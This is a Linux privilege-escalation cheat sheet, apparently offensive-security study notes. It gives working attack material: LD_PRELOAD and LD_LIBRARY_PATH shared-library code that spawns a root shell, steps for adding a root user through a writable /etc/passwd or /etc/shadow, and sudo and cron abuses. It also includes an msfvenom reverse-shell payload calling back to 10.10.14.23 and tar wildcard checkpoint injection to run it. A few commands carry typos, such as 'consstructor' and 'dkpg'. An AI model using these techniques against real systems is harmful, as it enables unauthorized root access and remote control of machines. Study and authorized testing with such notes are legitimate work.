# Linux Privilege Escalation 

## Tools
1. linpeas.sh
2. Linux Smart Enumeration
3. LinEnum

## Service Exploit
- ```ps aux | grep "^root"``` will show all processes running as root.
- Then try to identify the version number of each processes with:
```bash
<program> --version
<program> -v

# debian
dkpg -l | grep <program>

# rpm
rpm -qa | grep <program>
```
## Port Forwarding
- Run this in the victim machine:
``` ssh -R <local-port>:127.0.0.1:<servnice-port> <username>@<kali-machine>```
- you can use ```netstat -an``` or ```netstat -nl``` to see which port are listening locally. ```mysql``` usually listen on ```3306```
- now you can run services that are listening locally with your kali macchine for example:
```
mysql -u root -h 127.0.0.1 -P 4444
```
## Weak File Permissions

### /etc/shadow
- Example when ```/etc/shadow``` are readable for all, you can get the hash and bruteforce it.
- if ```/etc/shadow``` is writeable you can include your own password with ```mkpasswd -m sha-512 <password>```

### /etc/passwd
- if editing is possible you can attempt to remove the ```x``` from ```root:x:0:0:root:/bin/bash```. This tells linux root has no pw.
- alternatively, you can replace the hash in ```x``` using ```openssl passwd <password>```
- you can append a new row to create another alternative root user ```root2:<hash>:0:0:root2:/bin/bash```

### Backup
- Commmon place to look for backup files include ```/```, ```/tmp```, ```/var/backup```
- You may find ```ssh``` private key from readable ```.ssh``` directory

## Sudo
- Run a program with root using ```sudo <program>```
- Run a program with a specific user using ```sudo -u <username> <program>```
- Usually you will know if you can run program as another user or root through ```sudo -l```
- if you can run root as a user for all program but ```su``` is not available you can run things like
```
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```
- you can go to GTFObin to see if you can escape to root if there are available sudo program
- even if its not in GTFObin, you can try to abuse its intended use. For example ```sudo /usr/bin/apache2 -f /etc/shadow``` can read the file.

### ENV_RESET

- if this is not set you can change the path and escalate privilege.

### LD_PRELOAD
- will not work if real user id != effective user id
- sudo must be configured to preserve the LD_PRELOAD this can see in ```sudo -l```
- use this script named as ```preload.c```:
``` c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```
- compile it ```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c```
- run ```sudo LD_PRELOAD=/tmp/preload.so find``` to get root

### LD_LIBRARY_PATH
- ```sudo -l``` should state there is LD_LIBRARY_PATH
- run ```ldd /usr/sbin/apache2 #or any program name``` to list the shared library and pick any one.
- use this script called library_path.c
``` c
#include <stdio.h>
#include <stdlib.h>

static void hijack()__attribute__((consstructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```
- compile ```gcc -o libcrypt.so.1 -shared -fPIC library_path.c```
- run the program with that library ```sudo LD_LIBRARY_PATH=. apache2```

## Cron jobs 

- crontabs are usually located at ```/var/spool/cron/``` and ```/var/spool/cron/crontabs/```
- system wide crontab is located at ```/etc/crontab```

### File Permission + Cron
- ```cat /etc/crontab```
- check if cron jobs file are writeable ```ls -la```
- edit with reverse shell or bin/sh

### Path Env + Cron
- crontab default path is ```/usr/bin:/bin```
- you can create a file with same name so cron will trigger based on path
- ```cat /etc/crontab``` under ```PATH``` to see the path

### Wildcard + Cron
- if a cron job file as ```*``` and GTFO said you can get a shell you may use this method
- create a reverse shell with msfvenom 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=8133 -f elf -o shell.elf
```
- transfer to victim and make it executable
- run
```
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```
- setup nc and await cronjob.



## Kernel Exploit (Last Resort)
- To enumerate Kernel version ```uname -a```
- Find exploit
- Run (Beware usually is 1 time and will crash system)
- ```Linux exploit suggester 2``` is a good tool to find kernel exploit:
```./linux-exploit-suggester-2.pl -k <kernel version>```

